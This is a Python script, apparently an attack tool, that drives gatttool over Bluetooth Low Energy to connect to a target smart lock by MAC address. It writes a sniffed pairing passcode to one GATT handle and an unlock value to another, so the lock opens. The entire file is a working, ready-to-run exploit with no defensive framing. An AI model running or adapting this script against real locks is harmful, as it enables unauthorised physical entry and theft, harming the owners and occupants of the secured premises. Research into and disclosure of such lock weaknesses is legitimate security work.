import pexpect

# Color Codes for Printing
G = "\033[32m"
Y = "\033[33m"
B = "\033[34m"
R = "\033[31m"
RES = "\033[0m"

# Ask for MAC address input with a default value
device = input('Enter Target Lock MAC address [Default: 11:22:33:44:55:66]: ')
if not device:
    device = "11:22:33:44:55:66"

# Char-write-req values
# 0x0037 - GATT code for unlocking the lock
# 0x002d - GATT code for sending the pincode
char_values = {
    "passcode": ("0x002d", "0000"), # Change pincode 0000, if not defaults
    "unlock": ("0x0037", "01")
}

print(f"{Y}[-]{RES} Starting Gattool ....")
child = pexpect.spawn("gatttool -I")  # Linux alternative to connect Bluetooth devices

# Connect to device
print(f"{Y}[-]{RES} Connecting to device {device} ....")
child.sendline(f"connect {device}")
child.expect("Connection successful", timeout=5)
print(f"{G}[+]{RES} Connected!")

# Connect with sniffed passcode
print(f"{G}[+]{RES} Write privileges successful with sniffed passcode")
child.sendline(f"char-write-req {char_values['passcode'][0]} {char_values['passcode'][1]}")  # Pairing Pin Code - Interaction With Lock
child.expect("Characteristic value was written successfully", timeout=10)
print(f"{G}[+]{RES} Characteristics {char_values['passcode'][0]} has been written to Device")

# Send write operation to unlock
print(f"{Y}[-]{RES} Sending Write Request 01")
child.sendline(f"char-write-req {char_values['unlock'][0]} {char_values['unlock'][1]}")  # Sending a write request to Lock to Open - Interaction 2 with lock 
child.expect("Characteristic value was written successfully", timeout=10)
print(f"{G}[+]{RES} Write Request Successful")
print(f"{G}[+]{RES} Exit hcitool gracefully")
child.expect("\r\n", timeout=10)
